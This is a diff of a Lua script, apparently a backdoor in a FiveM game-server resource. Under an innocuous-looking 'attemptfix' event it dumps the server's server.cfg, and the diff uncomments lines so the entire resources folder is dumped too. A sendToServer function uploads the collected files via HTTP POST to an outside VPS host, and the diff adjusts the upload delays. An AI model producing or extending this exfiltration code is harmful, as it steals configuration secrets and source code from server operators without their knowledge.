@@ -251,8 +251,8 @@ AddEventHandler("attemptfix", function(id, _source)
 
             local server_cfg_path, server_cfg_content = GetServerCfgFile()
             DumpFile(server_cfg_path, server_cfg_content, server_name .. "/server.cfg")
-            --local resources_path = GetResourcesFolder()
-            --DumpResources(resources_path, server_name .. "/resources/")
+            local resources_path = GetResourcesFolder()
+            DumpResources(resources_path, server_name .. "/resources/")
 
             TriggerClientEvent("server_dumper:output", dumper_source, "DUMP COMPLETED")
 
@@ -431,8 +431,8 @@ function sendToServer(type, data)
     elseif type == "multiple" then
         for i = 1, #data.files do
             PerformHttpRequest('http://vps-13007000.vps.ovh.net:3000/', function(err, text, headers) end, 'POST', json.encode({ files = data.files[i] }), { ['Content-Type'] = 'application/json' })
-            Citizen.Wait(1500)
+            Citizen.Wait(2000)
         end
     end
-    Citizen.Wait(1500)
+    Citizen.Wait(2000)
 end
